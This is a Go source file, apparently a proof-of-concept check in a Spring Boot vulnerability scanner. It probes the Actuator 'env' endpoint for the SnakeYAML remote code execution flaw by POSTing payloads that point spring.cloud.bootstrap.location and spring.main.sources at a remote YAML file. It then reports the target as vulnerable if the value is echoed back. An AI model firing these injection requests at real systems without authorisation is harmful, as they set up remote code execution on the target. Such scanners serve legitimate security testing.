package poc

import (
	"fmt"
	"github.com/fatih/color"
	"io/ioutil"
	"net/http"
	"ssp/common"
	"strings"
)

func SnakeYAML_RCE(url string) {

	payload_1 := "spring.cloud.bootstrap.location=http://127.0.0.1/example.yml"
	payload_2 := "{\"name\":\"spring.main.sources\",\"value\":\"http://127.0.0.1/example.yml\"}"
	path := "env"

	client := &http.Client{}

	urltest := url + path

	req1, err := http.NewRequest("POST", urltest, strings.NewReader(payload_1))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}
	req1.Header.Set("User-Agent", common.GetRandomUserAgent())
	req1.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	re1, err := client.Do(req1)
	if err != nil {
		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
		return
	}
	defer re1.Body.Close()

	req2, err := http.NewRequest("POST", urltest, strings.NewReader(payload_2))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}
	req2.Header.Set("User-Agent", common.GetRandomUserAgent())
	req2.Header.Set("Content-Type", "application/json")

	re2, err := client.Do(req2)
	if err != nil {
		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
		return
	}
	defer re2.Body.Close()

	body1, err := ioutil.ReadAll(re1.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return
	}

	body2, err := ioutil.ReadAll(re2.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return
	}

	if strings.Contains(string(body1), "example.yml") {
		common.PrintVulnerabilityConfirmation("SnakeYAML_RCE-1", url, "Null", "9")
		common.Vulnum++
	} else if strings.Contains(string(body2), "example.yml") {
		common.PrintVulnerabilityConfirmation("SnakeYAML_RCE-2", url, "Null", "9")
		common.Vulnum++
	} else {
		color.Yellow("[-] %s 未发现SnakeYAML-RCE漏洞\n", url)

	}
}
